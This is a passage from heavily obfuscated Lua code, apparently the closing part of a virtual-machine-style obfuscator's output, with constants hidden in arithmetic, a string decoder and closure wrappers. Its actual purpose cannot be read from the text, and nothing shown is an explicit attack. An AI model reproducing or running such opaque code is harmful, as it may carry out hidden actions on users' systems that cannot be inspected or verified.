V=C[Z[446766+-446765]]n=V()end else k={}X=x()N=nil C[X]=k k=x()O=nil N=-73826+3020528003935 H=R(-184998+6708077,{X,I,v;J})K={}t=x()W=nil J=e(J)C[k]=H H={}w=nil E=y(188390+-213855)w=y(632820+-658307)p=nil b=y(219879+-245363)C[t]=H z=y(965455-990911)l=nil H=A[b]j=C[t]O=y(-428454-(-402988))B=nil F={[z]=j,[E]=p}b=H(K,F)a=b H=g(669813+4984375,{t;X;f,I,v;k})X=e(X)I=e(I)k=e(k)t=e(t)f=e(f)n=H k=691253+22860660393717 v=e(v)J=n(w,N)v=y(243240+-268718)I=342635+17370451248326 l=a[J]J=y(-437417-(-411949))N=y(-135528-(-110051))A[J]=l B=22009157116123-(-716598)w=n(N,B)B=y(-473327+447876)J=a[w]w=y(-405867-(-380396))A[w]=J N=n(B,I)w=a[N]N=y(-53700-(-28257))A[N]=w B=y(248424+-273903)N=A[B]I=A[v]f=n(O,k)W=a[f]c={}d=A[y(901899-927357)]f=y(814188-839674)a=nil f=I[f]v={f(I,W)}n=nil B=N(S(v))N=B()end else if d<413485+15041270 then d=true d=d and 140323-(-835066)or-827258+1752470 else X=#O H=88739-88739 k=X==H d=k and 15335989-185958 or 241767+9180857 end end else if d<847802+15440491 then if d<15327957-(-778872)then H=y(561512-586994)d=A[H]H=y(-62690+37196)A[H]=d d=12612001-(-237031)else D=-585008-(-585010)d=-114340+5684046 Q=E[D]D=C[j]p=Q==D m=p end else if d<16220910-(-148645)then O=y(821881+-847351)f=A[O]O=y(-827514+802069)W=f[O]I=W d=-756087+9005171 else d=C[Z[-515625-(-515632)]]d=d and 13618239-(-769912)or 8480+13889672 end end end end end end end d=#r return S(c)end,function(A,y)local S=a(y)local G=function(G,Z,r,q,c)return d(A,{G,Z;r,q;c},y,S)end return G end,function(A,y)local S=a(y)local G=function(G,Z,r,q)return d(A,{G;Z,r;q},y,S)end return G end,function(A)for y=580275-580274,#A,650293-650292 do V[A[y]]=V[A[y]]+(-1002623+1002624)end if G then local d=G(true)local S=r(d)S[y(-317721-(-292265))],S[y(-935741+910291)],S[y(-272926-(-247464))]=A,l,function()return 543153+-481583 end return d else return Z({},{[y(191805-217255)]=l,[y(-882859-(-857403))]=A;[y(-316319-(-290857))]=function()return-523696-(-585266)end})end end,function(A)V[A]=V[A]-(-432108-(-432109))if V[A]==160101+-160101 then V[A],C[A]=nil,nil end end,function(A,y)local S=a(y)local G=function(G)return d(A,{G},y,S)end return G end,{},function(A,y)local S=a(y)local G=function(G,Z)return d(A,{G,Z},y,S)end return G end,{},function()n=(958910+-958909)+n V[n]=-670644-(-670645)return n end,function(A,y)local S=a(y)local G=function()return d(A,{},y,S)end return G end,function(A)local y,d=-913019-(-913020),A[-648051-(-648052)]while d do V[d],y=V[d]-(-859898-(-859899)),y+(-240615+240616)if-510192-(-510192)==V[d]then V[d],C[d]=nil,nil end d=A[y]end end,function(A,y)local S=a(y)local G=function(...)return d(A,{...},y,S)end return G end return(J(214695+7767117,{}))(S(c))end)(getfenv and getfenv()or _ENV,unpack or table[y(-792825+767380)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
